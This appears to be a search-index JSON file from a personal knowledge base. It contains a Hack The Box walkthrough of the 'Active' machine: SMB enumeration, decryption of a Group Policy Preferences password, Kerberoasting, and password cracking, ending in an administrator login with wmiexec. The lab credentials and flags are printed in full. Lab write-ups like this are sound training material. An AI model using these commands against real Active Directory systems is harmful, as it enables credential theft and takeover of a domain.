{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome This is my personal knowledge base, where I will post everything I'm currently curious about.","title":"Introduction"},{"location":"#welcome","text":"This is my personal knowledge base, where I will post everything I'm currently curious about.","title":"Welcome"},{"location":"htb/active/","text":"Active This is Active Directory box, where we get to exploit a vulnerable Domain Controller. Enumeration Nmap -T4 : aggressive speed scan -sC : use safe default scripts -sV : detect service version -p- : scan all ports -Pn : skip host discovery nmap -T4 -sC -sV -p- -Pn 10 .10.10.100 There are some interesting ports: 88, 135, 139, 445, 389 RPC Trying to enumerate over RPC (Remote Procedure Call), but no luck there: rpcclient -U \"\" -N 10 .10.10.100 rpcclient $> enumdomusers rpcclient $> enumdomgroups SMB Checking if anonymous login is allowed over SMB (Server Message Block): smbclient -N -L 10 .10.10.100 smbclient -L 10 .10.10.100 --no-pass smbmap -H 10 .10.10.100 Only one share with read-only access: smbclient -N //10.10.10.100/Replication This directory looks interesting: smb: \\a ctive.htb \\p olicies \\{ 31B2F340-016D-11D2-945F-00C04FB984F9 } \\m achine \\P references \\G roups \\> dir Downloading groups.xml to host: We find credentials inside: <?xml version=\"1.0\" encoding=\"utf-8\"?> <Groups clsid= \"{3125E937-EB16-4b4c-9934-544FC6D24D26}\" ><User clsid= \"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name= \"active.htb\\SVC_TGS\" image= \"2\" changed= \"2018-07-18 20:46:06\" uid= \"{EF57DA28-5F69-4530-A59E-AAB58578219D}\" ><Properties action= \"U\" newName= \"\" fullName= \"\" description= \"\" cpassword= \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon= \"0\" noChange= \"1\" neverExpires= \"1\" acctDisabled= \"0\" userName= \"active.htb\\SVC_TGS\" /></User> </Groups> Since Microsoft published the AES private key, we can easily decrypt any Group Policy Preferences password: gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' LDAP Now we enumerate LDAP (Lightweight Directory Access Protocol), to get more information from Active Directory : nmap -sT -Pn -n --open 10 .10.10.100 -p389 --script ldap-rootdse Exploitation Crackmapexec Checking SMB login for service user: cme smb 10 .10.10.100 -d dc.active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 SMB smbclient -U \"active.htb\\SVC_TGS%GPPstillStandingStrong2k18\" -L 10 .10.10.100 smbmap -H 10 .10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18' Users directory looks interesting, because it's read-only and has no comments: smbclient -U \"active.htb\\SVC_TGS%GPPstillStandingStrong2k18\" //10.10.10.100/Users Flag We find user flag here: smb: \\SVC_TGS\\Desktop\\> get user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) 696f302836e481ebf6f935c Privilege Escalation Kerberoasting We're able to get Kerberos ticket from administrator user. GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10 .10.10.100 -request Cracking password with John the Ripper: john --wordlist = rockyou.txt ticket We can also use hashcat: hashcat.exe -m 13100 -a 0 ticket.txt rockyou.txt --force -O Now we can connect as administrator. wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100 Flag C:\\users\\administrator\\desktop>type root.txt 15295e8aca408c4ff3cb8adb9195ea49","title":"Active"},{"location":"htb/active/#active","text":"This is Active Directory box, where we get to exploit a vulnerable Domain Controller.","title":"Active"},{"location":"htb/active/#enumeration","text":"","title":"Enumeration"},{"location":"htb/active/#nmap","text":"-T4 : aggressive speed scan -sC : use safe default scripts -sV : detect service version -p- : scan all ports -Pn : skip host discovery nmap -T4 -sC -sV -p- -Pn 10 .10.10.100 There are some interesting ports: 88, 135, 139, 445, 389","title":"Nmap"},{"location":"htb/active/#rpc","text":"Trying to enumerate over RPC (Remote Procedure Call), but no luck there: rpcclient -U \"\" -N 10 .10.10.100 rpcclient $> enumdomusers rpcclient $> enumdomgroups","title":"RPC"},{"location":"htb/active/#smb","text":"Checking if anonymous login is allowed over SMB (Server Message Block): smbclient -N -L 10 .10.10.100 smbclient -L 10 .10.10.100 --no-pass smbmap -H 10 .10.10.100 Only one share with read-only access: smbclient -N //10.10.10.100/Replication This directory looks interesting: smb: \\a ctive.htb \\p olicies \\{ 31B2F340-016D-11D2-945F-00C04FB984F9 } \\m achine \\P references \\G roups \\> dir Downloading groups.xml to host: We find credentials inside: <?xml version=\"1.0\" encoding=\"utf-8\"?> <Groups clsid= \"{3125E937-EB16-4b4c-9934-544FC6D24D26}\" ><User clsid= \"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name= \"active.htb\\SVC_TGS\" image= \"2\" changed= \"2018-07-18 20:46:06\" uid= \"{EF57DA28-5F69-4530-A59E-AAB58578219D}\" ><Properties action= \"U\" newName= \"\" fullName= \"\" description= \"\" cpassword= \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon= \"0\" noChange= \"1\" neverExpires= \"1\" acctDisabled= \"0\" userName= \"active.htb\\SVC_TGS\" /></User> </Groups> Since Microsoft published the AES private key, we can easily decrypt any Group Policy Preferences password: gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'","title":"SMB"},{"location":"htb/active/#ldap","text":"Now we enumerate LDAP (Lightweight Directory Access Protocol), to get more information from Active Directory : nmap -sT -Pn -n --open 10 .10.10.100 -p389 --script ldap-rootdse","title":"LDAP"},{"location":"htb/active/#exploitation","text":"","title":"Exploitation"},{"location":"htb/active/#crackmapexec","text":"Checking SMB login for service user: cme smb 10 .10.10.100 -d dc.active.htb -u SVC_TGS -p GPPstillStandingStrong2k18","title":"Crackmapexec"},{"location":"htb/active/#smb_1","text":"smbclient -U \"active.htb\\SVC_TGS%GPPstillStandingStrong2k18\" -L 10 .10.10.100 smbmap -H 10 .10.10.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18' Users directory looks interesting, because it's read-only and has no comments: smbclient -U \"active.htb\\SVC_TGS%GPPstillStandingStrong2k18\" //10.10.10.100/Users","title":"SMB"},{"location":"htb/active/#flag","text":"We find user flag here: smb: \\SVC_TGS\\Desktop\\> get user.txt getting file \\SVC_TGS\\Desktop\\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) 696f302836e481ebf6f935c","title":"Flag"},{"location":"htb/active/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"htb/active/#kerberoasting","text":"We're able to get Kerberos ticket from administrator user. GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10 .10.10.100 -request Cracking password with John the Ripper: john --wordlist = rockyou.txt ticket We can also use hashcat: hashcat.exe -m 13100 -a 0 ticket.txt rockyou.txt --force -O Now we can connect as administrator. wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100","title":"Kerberoasting"},{"location":"htb/active/#flag_1","text":"C:\\users\\administrator\\desktop>type root.txt 15295e8aca408c4ff3cb8adb9195ea49","title":"Flag"}]}